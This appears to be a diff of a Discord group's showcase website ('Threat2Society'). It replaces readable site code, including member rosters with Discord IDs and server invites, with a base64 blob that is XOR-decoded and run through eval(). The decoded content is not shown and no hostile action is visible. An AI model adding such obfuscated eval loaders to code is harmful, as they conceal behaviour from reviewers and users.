+pogi_si_caliber += "8YODg4ODm5ub5oODg5qbm5uDg5ubm+aDm5ubm42IgYODg4ODg5";
+pogi_si_caliber += "ebm5udg4ODg4ODqYyMg5qbm5uDg4ODg4Oam5ubg4Oam5ubg4OD";
+pogi_si_caliber += "g5ubm/GDg4ODg5ubm+aDg4Oam5ubg4Obm5vmg5ubm5vvg4ODg4";
+pogi_si_caliber += "ODg43Hm5ub74ONiIODg6mMjIOcm5ubm9aNjYyDmpubm4ODmpub";
+pogi_si_caliber += "m4ODg42bm5vhg42Dg4Obm5uFg4ONm5ubm4ODm5ubgYOEm5ubm8";
+pogi_si_caliber += "CNg42Ig4P9gZubm5uJgYODg4OpjIyDg4Gbm5ub84SDg4Gbm5uJ";
+pogi_si_caliber += "gYGbm5uBg4P9iZubm4aDg4OD8Zubm4GDg8OGm5ubiYaBg4ODg4";
+pogi_si_caliber += "Gbm5ubm4aDg4ODg4ODgfqBg4ODg4ODqYyMg4ODg4HzhIODg4OD";
+pogi_si_caliber += "/fqBg4OD/fqEg4ODg4OBhoODg4ODg4OBgYODg4ODg4OBw4ODg4";
+pogi_si_caliber += "ODg4ODg4H684SDg4ODg4ODg4ODg4ODg4ODg6mDg4ODg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4Op";
 
-(() => {
-'use strict';
-
-
-if(window.tailwind){
-  window.tailwind.config = {
-    theme: {
-      extend: {
-        colors: {
-          blood: {
-            DEFAULT: '#ff2438',
-            soft: '#ff6b78',
-            dim: '#b33a46',
-            ok: '#ff4d5c',
-            deep: '#7a2a33',
-            ash: '#6b4046',
-            dusk: '#4a1a20'
-          },
-          good: '#4ade80',
-          warn: '#facc15',
-          mute: '#5b5b63'
-        },
-        fontFamily: {
-          mono: ['"Cascadia Code"', 'Consolas', '"Lucida Console"', 'ui-monospace', 'monospace']
-        }
-      }
-    }
-  };
-}
-
-const esc = s => String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
-
-const CONFIG = 
-{
-  siteName: 'Threat2Society',
-
-  copy: {
-    heroTagline:        'they hate us cuz they aint us',
-    hofSubtitle:         "bet you can't be us",
-    bigThreatsSubtitle:  'ingat sa mga to baka patayin ka nila',
-    membersSubtitle:     'mga bawal batahin',
-    godmothersSubtitle:  'the ones who made us',
-  },
-
-  
-  discordInvite: {
-    name: 'Threat2Society',
-    url: 'https://discord.gg/nNW8WBtxGw',
-  },
-
-  terminal: {
-    user: 't2s',
-    host: 'caliber',
-    status: 'Status: silent but can be the reason of your nightmare',
-    about: [
-      'started as a small circle until it became one of the most hated names in the area',
-    ],
-    roster: [
-      'everybody wanna be us, but they cant be us',
-    ],
-  },
-
-  asciiArt: `     s                                                         s                      .x+=:.                            .                    s                 
-    :8      .uef^"                                            :8      .--~*teu.      z\`    ^%                          @88>                 :8      ..         
-   .88    :d88E          .u    .                             .88     dF     988Nx       .   <k        u.               %8P                 .88     @L          
-  :888ooo \`888E        .d88B :@8c       .u          u       :888ooo d888b   \`8888>    .@8Ned8"  ...ue888b        .      .         .u      :888ooo 9888i   .dL  
--*8888888  888E .z8k  ="8888f8888r   ud8888.     us888u.  -*8888888 ?8888>  98888F  .@^%8888"   888R Y888r  .udR88N   .@88u    ud8888.  -*8888888 \`Y888k:*888. 
-  8888     888E~?888L   4888>'88"  :888'8888. .@88 "8888"   8888     "**"  x88888~ x88:  \`)8b.  888R I888> <888'888k ''888E\` :888'8888.   8888      888E  888I 
-  8888     888E  888E   4888> '    d888 '88%" 9888  9888    8888          d8888*\`  8888N=*8888  888R I888> 9888 'Y"    888E  d888 '88%"   8888      888E  888I 
-  8888     888E  888E   4888>      8888.+"    9888  9888    8888        z8**"\`   :  %8"    R88  888R I888> 9888        888E  8888.+"      8888      888E  888I 
- .8888Lu=  888E  888E  .d888L .+   8888L      9888  9888   .8888Lu=   :?.....  ..F   @8Wou 9%  u8888cJ888  9888        888E  8888L       .8888Lu=   888E  888I 
- ^%888*    888E  888E  ^"8888*"    '8888c. .+ 9888  9888   ^%888*    <""888888888~ .888888P\`    "*888*P"   ?8888u../   888&  '8888c. .+  ^%888*    x888N><888' 
-   'Y"    m888N= 888>     "Y"       "88888%   "888*""888"    'Y"     8:  "888888*  \`   ^"F        'Y"       "8888P'    R888"  "88888%      'Y"      "88"  888  
-           \`Y"   888                  "YP'     ^Y"   ^Y'             ""    "**"\`                              "P'       ""      "YP'                      88F  
-                J88"                                                                                                                                     98"   
-                @%                                                                                                                                     ./"     
-              :"                                                                                                                                      ~\``,
-
-  bgAscii: `            Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶                  
-        Â¶Â¶Â¶Â¶             Â¶Â¶Â¶Â¶Â¶              
-       Â¶Â¶Â¶                   Â¶Â¶Â¶Â¶          
-      Â¶Â¶Â¶Â¶                      Â¶Â¶Â¶        
-     Â¶Â¶                          Â¶Â¶Â¶      
-    Â¶Â¶                              Â¶Â¶     
-   Â¶Â¶                               Â¶Â¶    
-   Â¶                                  Â¶   
-  Â¶Â¶                                  Â¶Â¶  
- Â¶Â¶          Â¶Â¶Â¶                       Â¶  
-  Â¶         Â¶Â¶                          Â¶Â¶ 
-  Â¶         Â¶               Â¶Â¶Â¶         Â¶Â¶ 
-  Â¶    Â¶Â¶ Â¶Â¶ Â¶Â¶Â¶Â¶Â¶ Â¶          Â¶Â¶Â¶        Â¶ 
-  Â¶        Â¶   Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶    Â¶Â¶Â¶        Â¶ 
-  Â¶Â¶     Â¶Â¶Â¶Â¶  Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶  Â¶Â¶Â¶ Â¶Â¶   Â¶Â¶Â¶
-  Â¶Â¶   Â¶Â¶Â¶Â¶Â¶Â¶  Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶ Â¶Â¶Â¶Â¶Â¶Â¶Â¶ Â¶Â¶ 
-  Â¶   Â¶Â¶Â¶Â¶Â¶Â¶Â¶   Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶ Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶  
- Â¶Â¶  Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶   Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶ Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶  
-    Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶    Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶ Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶  
-      Â¶Â¶Â¶Â¶Â¶Â¶Â¶  Â¶Â¶    Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶   Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶  
-      Â¶  Â¶Â¶Â¶   Â¶Â¶Â¶                 Â¶Â¶Â¶Â¶Â¶Â¶Â¶   
-     Â¶Â¶       Â¶Â¶Â¶Â¶Â¶Â¶ Â¶               Â¶Â¶Â¶     
-     Â¶Â¶     Â¶Â¶Â¶    Â¶Â¶Â¶Â¶           Â¶Â¶Â¶Â¶       
-      Â¶Â¶     Â¶      Â¶Â¶        Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶      
-       Â¶Â¶Â¶Â¶Â¶          Â¶  Â¶ Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶Â¶       
-          Â¶Â¶Â¶   Â¶Â¶Â¶Â¶ Â¶Â¶ Â¶Â¶Â¶  Â¶Â¶Â¶Â¶Â¶  Â¶Â¶       
-           Â¶Â¶Â¶Â¶Â¶ Â¶  Â¶Â¶ Â¶ Â¶ Â¶   Â¶Â¶    Â¶       
-            Â¶          Â¶Â¶    Â¶     Â¶       
-             Â¶Â¶Â¶Â¶Â¶ Â¶Â¶Â¶Â¶Â¶Â¶       Â¶Â¶    Â¶       
-                  Â¶Â¶Â¶Â¶Â¶Â¶          Â¶    Â¶       
-                   Â¶Â¶ Â¶Â¶          Â¶Â¶  Â¶Â¶       
-                    Â¶Â¶Â¶Â¶Â¶          Â¶    Â¶       
-                     Â¶Â¶Â¶Â¶Â¶        Â¶Â¶    Â¶Â¶      
-                     Â¶Â¶Â¶Â¶Â¶       Â¶ Â¶     Â¶      
-                     Â¶ Â¶Â¶Â¶      Â¶  Â¶Â¶    Â¶      
-                     Â¶Â¶Â¶Â¶Â¶     Â¶Â¶  Â¶Â¶  Â¶       
-                     Â¶Â¶Â¶Â¶Â¶   Â¶Â¶Â¶  Â¶Â¶  Â¶       
-                      Â¶Â¶Â¶Â¶Â¶Â¶Â¶  Â¶Â¶Â¶   Â¶Â¶       
-                       Â¶Â¶    Â¶Â¶Â¶    Â¶          
-                           Â¶Â¶Â¶Â¶     Â¶          
-                             Â¶Â¶    Â¶Â¶          
-                              Â¶Â¶Â¶Â¶Â¶Â¶Â¶`,
-
-  mainThreats: [
-    { name:'daz', music:'pf/daz.mp3', background:'pf/daz.gif', discordId:'1521890728094208122' },
-    { name:'caliber', music:'pf/caliber.mp3', background: 'pf/caliber.gif', discordId:'1512675755459612835' },
-    { name:'faiyaz', music:'', background:'', discordId:'1402292483584426134' },
-  ],
-
-  bigThreats: [
-    { name:'zowi', music:'pf/zowi.mp3', background:'pf/zowi.gif', discordId:'1081132499767410688' },
-    { name:'sevi', music:'', background:'',  discordId:'769457309562568706' },
-    { name:'jon', music:'pf/jon.mp3', background:'pf/jon.gif', discordId:'1010028872282157106' },
-    { name:'gun', music:'pf/gun.mp3', background:'pf/gun.gif', discordId:'1495036966360842260' },
-    { name:'yuzuki', music:'pf/yuzuki.mp3', background:'pf/yuzuki.gif', discordId:'1518082674017701888' },
-    { name:'zy', music:'pf/zy.mp3', background:'pf/zy.gif', discordId:'1245749945353375766' },
-    { name:'kio', music:'pf/kio.mp3', background:'pf/kio.gif',  discordId:'751387160057217066' },
-    { name:'rue', music:'pf/rue.mp3', background:'pf/rue.gif', discordId:'1502126548096909353' },
-    { name:'cho',     discordId:'1503083605444788235' },
-    { name:'zei',   discordId:'1248910763494473728' },
-    { name:'forth',    discordId:'1505315891087282176' },
-    { name:'soul',    discordId:'1446067102900551741' },
-    { name:'blake', music:'pf/blake.mp3', background:'pf/blake.gif',  discordId:'1244678008175071263' },
-    { name:'jor', music:'pf/jor.mp3', background:'pf/jor.gif', discordId:'1403234492419670038' },
-    { name:'fenzi', music:'pf/fenzi.mp3', background:'pf/fenzi.gif', discordId:'909977852378763264' },
-  ],
-
-  heirs: [
-    { name:'jamal', music:'pf/jamal.mp3', background:'pf/jamal.gif', discordId:'795725566476812348' },
-    { name:'mudd', music:'pf/mudd.mp3', background:'pf/mudd.jpg', discordId:'1550100417185058816' },
-  ],
-
-  godmothers: [
-    { name:'sao', music:'pf/sao.mp3', background:'pf/sao.gif', discordId:'1310763051636752415' },
-    { name:'aeri', music:'pf/aeri.mp3', background:'pf/aeri.gif', discordId:'992033485973880842' },
-    { name:'juls', music:'pf/juls.mp3', background:'pf/juls.gif', discordId:'1499499066932068454' },
-    { name:'saori', music:'pf/saori.mp3', background:'pf/saori.gif', discordId:'1435619294229561434' },
-    { name:'riri', music:'pf/riri.mp3', background:'pf/riri.gif', discordId:'1005743967423438879' },
-  ],
-
-  members: [
-    { name:'louve',    discordId:'902804741883588619' },
-    { name:'xin', music:'pf/xin.mp3', background:'pf/xin.gif', discordId:'1566896874609311744' },
-    { name:'ryokai',   discordId:'900336233031540787' },
-    { name:'zei',   discordId:'1248910763494473728' },
-    { name:'wiz',   discordId:'1280059534169210896' },
-    { name:'mimi',   discordId:'1444205221814210700' },
-    { name:'seia',    discordId:'748713264652746813' },
-    { name:'ghost',   discordId:'965848814164520970' },
-    { name:'achilles',    discordId:'1267509727877791835' },
-    { name:'mira',    discordId:'1389643555726823464' },
-    { name:'fade',    discordId:'1124369205727330346' },
-    { name:'finxsse',    discordId:'1459878964838531208' },
-    { name:'ck',    discordId:'1459977412216487958' },
-    { name:'dope',    discordId:'1530686788824469646' },
-    { name:'rian',    discordId:'1147462845315952690' },
-    { name:'kei',    discordId:'1331628794305314837' },
-    { name:'allie',    discordId:'1441623190412726355' },
-  ],
-
-  gangnem: [
-    { name: '', invite: 'https://discord.gg/86bvBVXaFV', online: null, members: null },
-    { name: '', invite: 'https://discord.gg/sPRtUMTzfC', online: null, members: null },
-    { name: '', invite: 'https://discord.gg/QXxs5Pxp48', online: null, members: null },
-    { name: '', invite: 'https://discord.gg/zXdMdcRgCM', online: null, members: null },
-    { name: '', invite: 'https://discord.gg/cukMb47w4v', online: null, members: null },
-    { name: '', invite: 'https://discord.gg/8QqUkcA6EB', online: null, members: null },
-    { name: '', invite: 'https://discord.gg/waWUFz28xJ', online: null, members: null },
-    { name: '', invite: 'https://discord.gg/wRgPQzz5Px', online: null, members: null },
-  ],
-
-  music: {
-    url: 'music/t2sontop_V1.mp3',
-    volume: 0.50,
-  },
-
-  profileDefaults: {
-    banner: 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(
-      '<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="340" viewBox="0 0 1200 340">'
-      + '<defs>'
-      + '<linearGradient id="g" x1="0" y1="0" x2=".85" y2="1">'
-      + '<stop offset="0" stop-color="#2b0509"/><stop offset=".55" stop-color="#150207"/><stop offset="1" stop-color="#070102"/>'
-      + '</linearGradient>'
-      + '<radialGradient id="r" cx=".16" cy=".08" r=".95">'
-      + '<stop offset="0" stop-color="#ff2438" stop-opacity=".38"/><stop offset="1" stop-color="#ff2438" stop-opacity="0"/>'
-      + '</radialGradient>'
-      + '<pattern id="d" width="24" height="24" patternUnits="userSpaceOnUse" patternTransform="rotate(35)">'
-      + '<line x1="0" y1="0" x2="0" y2="24" stroke="#ff2438" stroke-opacity=".07" stroke-width="1"/>'
-      + '</pattern>'
-      + '</defs>'
-      + '<rect width="1200" height="340" fill="url(#g)"/>'
-      + '<rect width="1200" height="340" fill="url(#r)"/>'
-      + '<rect width="1200" height="340" fill="url(#d)"/>'
-      + '<path d="M0 292 L1200 202" stroke="#ff2438" stroke-opacity=".12" stroke-width="2"/>'
-      + '<path d="M0 310 L1200 220" stroke="#ff2438" stroke-opacity=".07" stroke-width="1"/>'
-      + '<text x="1136" y="300" text-anchor="end" font-family="Consolas,monospace" font-size="196" font-weight="700" letter-spacing="-10" fill="#ff2438" fill-opacity=".08">T2S</text>'
-      + '</svg>'
-    ),
-    background: 'images/banner.gif',
-  },
-
-  loadingAscii: `     s                      .x+=:.   
-     :8      .--~*teu.      z\`    ^%  
-    .88     dF     988Nx       .   <k 
-  :888ooo d888b   \`8888>    .@8Ned8" 
--*8888888 ?8888>  98888F  .@^%8888"  
-  8888     "**"  x88888~ x88:  \`)8b. 
-  8888          d8888*\`  8888N=*8888 
-  8888        z8**"\`   :  %8"    R88 
- .8888Lu=   :?.....  ..F   @8Wou 9%  
- ^%888*    <""888888888~ .888888P\`   
-   'Y"     8:  "888888*  \`   ^"F     
-           ""    "**"\``,
-
-};
-document.getElementById('root').innerHTML = `
-<div id="bg" aria-hidden="true"></div>
-<canvas id="matrix" aria-hidden="true"></canvas>
-<canvas id="smoke" aria-hidden="true"></canvas>
-
-<div id="enter" role="button" tabindex="0" aria-label="Playing intro" class="fixed inset-0 z-50 grid cursor-pointer place-items-center overflow-hidden bg-black p-5 text-blood focus:outline-none">
-  <div class="splash" aria-hidden="true">
-    <img id="splashArt" class="splash-video" src="media/intro-3s.gif" width="600" height="600" alt="" draggable="false">
-    <img id="splashEnd" class="splash-video splash-end" src="media/intro-hold.png" width="600" height="600" alt="" draggable="false">
-  </div>
-  <div class="enter-inner relative z-[1] flex max-w-full flex-col items-center">
-    <pre id="enterArt" class="relative z-[1] m-0 select-none whitespace-pre font-mono leading-none text-blood" aria-hidden="true"></pre>
-    <div class="enter-load" aria-hidden="true">
-      <span class="enter-load-label">loading</span>
-      <span class="enter-load-bar"><i id="enterLoadFill"></i></span>
-      <span class="enter-load-pct" id="enterLoadPct">0%</span>
-    </div>
-    <span class="enter-tag" aria-hidden="true">@ t2s</span>
-  </div>
-  <span class="enter-hint">[ click to enter ]</span>
-</div>
-
-<div id="shell" class="relative z-[3] flex h-full flex-col items-center overflow-x-hidden overflow-y-auto px-[4vw] pb-[7vh] pt-[6vh] max-[700px]:pb-[6vh] max-[700px]:pt-[5vh]">
-  <section id="hero" class="relative flex min-h-[calc(100dvh_-_6vh)] w-full flex-col items-center justify-center max-[700px]:min-h-[calc(100dvh_-_5vh)]">
-    <div class="banner-wrap relative flex w-full justify-center overflow-hidden"><pre id="banner" class="relative m-0 select-none whitespace-pre font-mono leading-none text-blood" aria-hidden="true"></pre></div>
-    <p class="mt-[46px] text-center text-[17px] tracking-[.02em] max-[700px]:text-[15px]"><span class="tagline">${esc(CONFIG.copy.heroTagline)}</span></p>
-  </section>
-  <div id="roster" class="mt-12 flex w-[min(1120px,100%)] flex-col items-center gap-[34px] max-[700px]:mt-10 max-[700px]:gap-7"></div>
-  <section id="gangnem" class="reveal mt-[34px] w-[min(1120px,100%)] max-[700px]:mt-7" aria-label="servers">
-    <div class="sec-title">gangnem</div>
-    <div id="gangnemRow" class="marquee"></div>
-  </section>
-  <section id="term" class="reveal mt-14 w-[min(1120px,100%)]" aria-label="terminal">
-    <div class="overflow-hidden rounded-xl border border-blood/25 bg-[#050102] shadow-[0_26px_80px_rgba(0,0,0,.85),0_0_56px_rgba(255,36,56,.08)]">
-      <div class="flex items-center gap-3 border-b border-blood/20 bg-[#0c0205] px-3.5 py-2">
-        <span class="flex flex-none items-center gap-1.5" aria-hidden="true">
-          <i class="h-2.5 w-2.5 rounded-full bg-blood shadow-[0_0_8px_rgba(255,36,56,.55)]"></i>
-          <i class="h-2.5 w-2.5 rounded-full bg-blood-dim"></i>
-          <i class="h-2.5 w-2.5 rounded-full bg-blood-dusk"></i>
-        </span>
-        <span class="min-w-0 flex-1 truncate text-center text-[10.5px] tracking-[.14em] text-blood-dim">${esc(CONFIG.terminal.user)}@${esc(CONFIG.terminal.host)}: ~</span>
-        <span class="w-[46px] flex-none select-none text-right text-[9px] tracking-[.2em] text-blood-ash" aria-hidden="true">tty1</span>
-      </div>
-      <div id="termBody" class="px-4 pb-4 pt-4 font-mono text-[12.5px] leading-[1.62] text-blood-soft max-[700px]:px-3 max-[700px]:text-[11.5px]">
-        <div id="termOut" class="whitespace-pre-wrap break-words" role="log" aria-live="polite" aria-label="Terminal output"></div>
-        <form id="termForm" class="mt-2 flex items-center gap-1.5" autocomplete="off">
-          <span class="flex-none select-none" aria-hidden="true"><span class="text-blood-ok">${esc(CONFIG.terminal.user)}@${esc(CONFIG.terminal.host)}</span><span class="text-blood-ash">:</span><span class="text-blood">~</span><span class="text-blood-ash">$</span></span>
-          <input id="termInput" class="min-w-0 flex-1 border-0 bg-transparent p-0 font-mono text-[12.5px] text-blood caret-blood outline-none placeholder:text-blood-ash/70 max-[700px]:text-[16px]" type="text" placeholder="type 'help'" aria-label="Terminal command" spellcheck="false" autocapitalize="off" autocorrect="off">
-        </form>
-      </div>
-      <div class="flex flex-wrap items-center justify-between gap-x-4 gap-y-2 border-t border-blood/15 bg-[#0a0103] px-3.5 py-2 text-[10px] tracking-[.08em] text-blood-dim">
-        <span class="flex flex-wrap items-center gap-x-2 gap-y-1">
-          <span>${esc(CONFIG.siteName.toLowerCase())} / all hail t2s</span>
-          <span class="h-[3px] w-[3px] rounded-full bg-blood-dim/70"></span>
-          <a class="border-b border-blood-dim/40 pb-px transition-colors hover:border-blood hover:text-blood" href="${esc(CONFIG.discordInvite.url)}" target="_blank" rel="noopener noreferrer">${esc(CONFIG.discordInvite.name)}</a>
-        </span>
-        <span class="select-none">tty1 &middot; 80x24</span>
-      </div>
-    </div>
-  </section>
-</div>
-
-<div id="hoverCard" class="invisible fixed z-[25] w-[216px] translate-y-1.5 scale-[.98] overflow-hidden rounded-lg border border-blood/35 bg-[#0a0104] opacity-0 shadow-[0_16px_42px_rgba(0,0,0,.82),0_0_28px_rgba(255,36,56,.14),inset_0_1px_0_rgba(255,60,75,.06)]" aria-hidden="true">
-  <div class="hc-banner relative h-[58px] bg-[#1a070a] bg-cover bg-center bg-no-repeat" id="hoverCardBanner"></div>
-  <div class="relative z-[1] -mt-[21px] flex items-end gap-2 px-[11px]">
-    <div class="hc-av offline relative h-[42px] w-[42px] flex-none rounded-full border-2 border-[#0a0405] shadow-[0_0_16px_rgba(255,36,56,.35)]" id="hoverCardAvatarWrap">
-      <img class="a block h-full w-full rounded-full bg-[#1a070a] object-cover transition-opacity duration-300" id="hoverCardAvatar" src="" alt="">
-      <span class="s absolute -bottom-px -right-px z-[2] h-3 w-3 rounded-full border-2 border-[#0a0405]"></span>
-    </div>
-    <div class="min-w-0 pb-px">
-      <div class="truncate text-[12.5px] leading-tight tracking-[.02em] text-blood-soft" id="hoverCardName"></div>
-      <div class="truncate text-[9.5px] tracking-[.03em] text-blood-dim" id="hoverCardHandle"></div>
-    </div>
-  </div>
-  <div class="px-[11px] pt-[7px]"><span class="st offline" id="hoverCardStatus"><i></i><span>offline</span></span></div>
-  <div class="truncate px-[11px] pb-2.5 pt-1 text-[9.5px] tracking-[.02em] text-blood-dim" id="hoverCardAct"></div>
-</div>
-
-<audio id="bgMusicEl" preload="none" loop></audio>
-<audio id="profileMusicEl" preload="none" loop></audio>
-
-<div id="profileModal" class="invisible fixed inset-0 z-30 grid place-items-center bg-black/70 p-[18px] opacity-0" aria-hidden="true">
-  <div class="tm relative z-[1] flex max-h-[92dvh] w-[min(96vw,780px)] translate-y-4 scale-[.965] flex-col overflow-hidden rounded-[10px] border border-blood/40 bg-[#080103] shadow-[0_34px_90px_rgba(0,0,0,.92),0_0_70px_rgba(255,36,56,.16),inset_0_1px_0_rgba(255,60,75,.07)] max-[700px]:w-full" role="dialog" aria-modal="true" aria-label="Member profile">
-    <div class="flex flex-none items-center gap-[11px] border-b border-blood/20 bg-[#100206] px-[13px] py-2.5 text-[11px] tracking-[.06em] text-blood-dim">
-      <span class="tm-dots"><i></i><i></i><i></i></span>
-      <span class="min-w-0 flex-1 truncate text-blood-soft/80" id="profileModalPath">t2s@shell: ~/profiles</span>
-      <button class="grid h-[22px] w-[22px] flex-none place-items-center rounded-[3px] border-0 bg-transparent text-[13px] leading-none text-blood-dim transition-colors hover:bg-blood/20 hover:text-blood" type="button" id="profileModalClose" aria-label="Close profile">&#10005;</button>
-    </div>
-    <div class="tm-body relative min-h-0 flex-1 overflow-y-auto overscroll-contain px-6 pb-6 pt-5 font-mono text-[14.5px] leading-[1.66] text-blood-soft [-webkit-overflow-scrolling:touch] max-[700px]:px-4 max-[700px]:pb-[18px] max-[700px]:pt-4 max-[700px]:text-[13.5px]" id="profileModalBody">
-      <div class="tm-line mb-1 truncate whitespace-nowrap text-blood-ok">
-        <span class="text-blood-dim pm-user">t2s@shell</span><span class="text-[#6b4046]">:</span><span class="text-blood [text-shadow:0_0_8px_rgba(255,36,56,.35)]">~</span><span class="text-[#6b4046]">$</span> <span class="ml-1.5 text-blood" id="profileModalCmd"></span>
-      </div>
-      <div class="tm-run mt-[7px] flex items-center gap-2 text-[12.5px] tracking-[.01em] text-blood-dim opacity-0" id="profileModalRun" hidden>
-        <span class="tm-spin h-2.5 w-2.5 flex-none animate-[spin_.7s_linear_infinite] rounded-full border-[1.5px] border-blood/30 border-t-blood"></span><span id="profileModalRunText"></span>
-      </div>
-      <div class="tm-out my-3.5 ml-0 pl-px">
-        <div class="mb-3.5 text-xs tracking-[.02em] text-blood-dim">fetching profile from discord <span class="text-blood [text-shadow:0_0_8px_rgba(255,36,56,.35)]">[ ok ]</span></div>
-        <div class="mb-3.5 flex items-center gap-3.5">
-          <div class="tm-av offline relative h-20 w-20 flex-none max-[700px]:h-16 max-[700px]:w-16 max-[360px]:h-14 max-[360px]:w-14" id="profileModalAvatarWrap">
-            <img class="a block h-full w-full rounded-full bg-[#1a070a] object-cover shadow-[0_0_26px_rgba(255,36,56,.36)] transition-opacity duration-300" id="profileModalAvatar" src="" alt="">
-            <span class="s absolute -bottom-px -right-px z-[2] h-[18px] w-[18px] rounded-full border-[3px] border-[#0a0405]"></span>
-          </div>
-          <div class="min-w-0">
-            <div class="truncate text-[22px] leading-tight tracking-[.03em] text-[#ff7b87] max-[700px]:text-[19px] max-[360px]:text-[17px]" id="profileModalName"></div>
-            <div class="mt-1 text-[13px] tracking-[.03em] text-blood-dim" id="profileModalHandle"></div>
-          </div>
-          <pre class="pm-art" id="profileModalArt" aria-hidden="true"></pre>
-        </div>
-        <div class="grid grid-cols-[96px_1fr] gap-2.5 text-[13.5px] leading-[1.82] max-[700px]:grid-cols-[82px_1fr] max-[700px]:text-[12.5px]"><span class="k text-[#b06a72] after:float-right after:text-[#5e3a3f] after:content-[':']">status</span><span class="min-w-0 break-words text-blood-soft"><span class="st offline" id="profileModalStatus"><i></i><span>offline</span></span></span></div>
-        <div class="grid grid-cols-[96px_1fr] gap-2.5 text-[13.5px] leading-[1.82] max-[700px]:grid-cols-[82px_1fr] max-[700px]:text-[12.5px]"><span class="k text-[#b06a72] after:float-right after:text-[#5e3a3f] after:content-[':']">activity</span><span class="min-w-0 break-words text-blood-soft" id="profileModalStatusText"></span></div>
-        <div class="grid grid-cols-[96px_1fr] gap-2.5 text-[13.5px] leading-[1.82] max-[700px]:grid-cols-[82px_1fr] max-[700px]:text-[12.5px]"><span class="k text-[#b06a72] after:float-right after:text-[#5e3a3f] after:content-[':']">views</span><span class="min-w-0 break-words text-blood-soft" id="profileModalViewsCount">&middot;&middot;&middot;</span></div>
-      </div>
-      <div class="tm-line tm-end mb-1 mt-0.5 truncate whitespace-nowrap text-blood-ok"><span class="text-blood-dim pm-user">t2s@shell</span><span class="text-[#6b4046]">:</span><span class="text-blood [text-shadow:0_0_8px_rgba(255,36,56,.35)]">~</span><span class="text-[#6b4046]">$</span> <span class="tm-caret ml-[7px] inline-block h-4 w-2 -translate-y-[3px] animate-[bl_1s_steps(1)_infinite] bg-blood"></span></div>
-    </div>
-  </div>
-</div>
-`;
-
-const BG_LAYOUT = [
-  { top: '-10%', left: '62%',  size: 13, o: .16, r: 8,   dx: 18,  dy: -16 },
-  { top: '44%',  left: '-7%',  size: 11, o: .13, r: 5,   dx: -14, dy: 20  },
-  { top: '58%',  left: '47%',  size: 14, o: .12, r: -4,  dx: 12,  dy: -22 },
-  { top: '18%',  left: '80%',  size: 8,  o: .14, r: -12, dx: -16, dy: 14  },
-  { top: '-6%',  left: '-3%',  size: 9,  o: .09, r: -7,  dx: 14,  dy: 18  },
-  { top: '66%',  left: '74%',  size: 9,  o: .13, r: 10,  dx: -18, dy: -12 },
-  { top: '20%',  left: '26%',  size: 7,  o: .08, r: -10, dx: 16,  dy: -18 },
-  { top: '76%',  left: '28%',  size: 8,  o: .09, r: 6,   dx: -12, dy: 16  },
-];
-(function buildBackground(){
-  const bgEl = document.getElementById('bg');
-  for(const cfg of BG_LAYOUT){
-    const art = document.createElement('pre');
-    art.className = 'bgart';
-    art.setAttribute('aria-hidden', 'true');
-    art.textContent = CONFIG.bgAscii;
-    art.style.top = cfg.top;
-    art.style.left = cfg.left;
-    art.style.fontSize = cfg.size + 'px';
-    art.style.setProperty('--o', cfg.o);
-    art.style.setProperty('--r', cfg.r + 'deg');
-    art.style.setProperty('--dx', cfg.dx + 'px');
-    art.style.setProperty('--dy', cfg.dy + 'px');
-    bgEl.appendChild(art);
+(function(){
+  var _0x = pogi_si_caliber;
+  var _d = atob(_0x);
+  var _r = '';
+  for(var _i = 0; _i < _d.length; _i++){
+    _r += String.fromCharCode(_d.charCodeAt(_i) ^ 163);
   }
+  eval(_r);
 })();
-
-const CDN = 'https://cdn.discordapp.com/';
-const reduceMotion = matchMedia('(prefers-reduced-motion: reduce)').matches;
-
-function slugify(str){
-  return (str || '').toLowerCase().trim().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '') || 'member';
-}
-function def(id){
-  try{ return CDN + 'embed/avatars/' + Number((BigInt(id) >> 22n) % 6n) + '.png'; }
-  catch(e){ return CDN + 'embed/avatars/0.png'; }
-}
-function avatarUrl(u, id){
-  if(!u) return def(id);
-  return u.avatar
-    ? CDN + 'avatars/' + u.id + '/' + u.avatar + '.' + (u.avatar.indexOf('a_') === 0 ? 'gif' : 'png') + '?size=256'
-    : def(u.id);
-}
-function decoUrl(u){
-  const dc = u && u.avatar_decoration_data;
-  return dc && dc.asset ? CDN + 'avatar-decoration-presets/' + dc.asset + '.png?size=128&passthrough=true' : '';
-}
-function applyBackground(el, val){
-  const v = (val || '').trim();
-  if(!v) return false;
-  if(/^(url\(|linear-gradient|radial-gradient|conic-gradient)/i.test(v)){ el.style.backgroundImage = v; return true; }
-  if(/\.(png|jpe?g|gif|webp|avif|svg)$/i.test(v) || /^(https?:)?\//.test(v) || v.startsWith('data:')){ el.style.backgroundImage = 'url("' + v + '")'; return true; }
-  el.style.backgroundColor = v;
-  return false;
-}
-function backgroundValue(val){
-  const probe = document.createElement('div');
-  const ok = applyBackground(probe, val);
-  return { image: probe.style.backgroundImage, ok };
-}
